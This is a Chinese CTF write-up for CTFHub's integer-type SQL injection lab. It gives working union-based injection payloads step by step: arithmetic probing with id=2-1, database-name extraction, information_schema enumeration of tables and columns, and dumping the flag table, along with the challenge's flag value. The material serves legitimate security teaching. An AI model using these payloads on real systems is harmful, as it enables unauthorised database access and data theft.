---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 整数型注入"
date: 2026-10-26

skill: "web-sql/整数型注入"
completed: true
---

# CTFHub Writeup - 整数型注入

## 题目类型

Web

## 题目描述

页面结构：
代码块


                    SQL 整数型注入
 ┌──────────────────────────────────────────┐
 │ ID  │ 输个1试试？                        │ Search │
 └──────────────────────────────────────────┘
   （提交后，下面多出三行：）
   select * from news where id=1
   ID: 1
   Data: ctfhub


## 解题过程

<br>1. 提交任意 id 后，页面第一行回显服务端真实执行的 SQL，说明后端存在 echo $sql，属于调试信息残留。
<br>2. 记录的后端逻辑为：$id 取自 $\_GET\['id'\]，$sql 由 select \* from news where id=$id 拼接而成，随后整条交给 mysqli\_query，最终只取第一行并输出 id 和 data。
<br>3. 正常访问 GET /?id=1，页面回显 select \* from news where id=1、ID: 1、Data: ctfhub，确认存在 SQL 语句和查询结果回显。
<br>4. 访问 GET /?id=2-1，页面显示 select \* from news where id=2-1，但 ID 仍为 1、Data 仍为 ctfhub，与 id=1 的结果一致；用户据此判断输入被当作算术表达式求值，而不是字符串 2-1。
<br>5. 构造 GET /?id=-1 union select 1,database()，页面回显对应 SQL，并且 Data 为 sqli，得到当前数据库名。
<br>6. 构造 GET /?id=-1 union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema=database()，记录中预期回显为 ID: 1、Data: flag,news，用于枚举当前数据库中的表。
<br>7. 构造 GET /?id=-1 union select 1,group\_concat(column\_name) from information\_schema.columns where table\_name='flag'，页面回显 Data: flag，得到 flag 表的列名。
<br>8. 构造 GET /?id=-1 union select 1,flag from flag，页面回显 Data: ctfhub\{8e85f8d9a836c27574d04343\}，取得 flag。

## 疑问与解答

### 1.

<br>问题：为什么 id=2-1 能帮助确认整数型注入？
<br>解答：在整数上下文中，数据库会把 2-1 作为算术表达式计算为 1，因此查询结果与 id=1 相同；如果参数被引号包裹为字符型，2-1 通常只是字符串，不会自动得到 1 的记录。

### 2.

<br>问题：union 注入前为什么常用 id=-1？
<br>解答：后端只取 mysqli\_fetch\_assoc 的第一行，若原查询有正常记录，它可能占据第一行，导致 union 的结果无法显示；使用不存在的负 id 可以让原查询为空，使联合查询的结果成为回显内容。

### 3.

<br>问题：information\_schema 在本次注入中起什么作用？
<br>解答：information\_schema 是 MySQL 的元数据库，tables 和 columns 表可分别提供表名、列名信息；在不知道目标表结构时，可以用它先枚举当前数据库的表和字段，再查询具体数据。


## 本题的核心逻辑：



<br>漏洞根因是 GET 参数 id 被直接拼接进 SQL 语句，且处于整数上下文，既没有引号包裹也没有过滤；同时页面回显真实 SQL 和查询字段，后端又只取第一行，因此适合通过 union 联合查询控制回显。

<br>利用链为：先用负 id 使原查询无结果，再用 union select 构造与查询列数匹配的回显位，依次获取当前库名、表名和列名，最后从 flag 表中取出目标数据。


## 笔记

这道题主要学习了：

<br>1. 整数型注入的判定可以观察算术表达式是否被数据库求值；本次 2-1 得到与 1 相同的结果，说明参数处于整数上下文而不是字符串上下文。
<br>2. 联合查询需要列数匹配并依赖页面回显位；当后端只取第一行时，使用负 id 让原查询为空是常用技巧，可避免正常记录遮蔽 union 结果。
<br>3. information\_schema 可用于枚举数据库、表和列等元数据，是 SQL 注入中从库名走向具体字段和数据的重要入口；后续可继续学习布尔盲注、时间盲注和报错注入等场景。
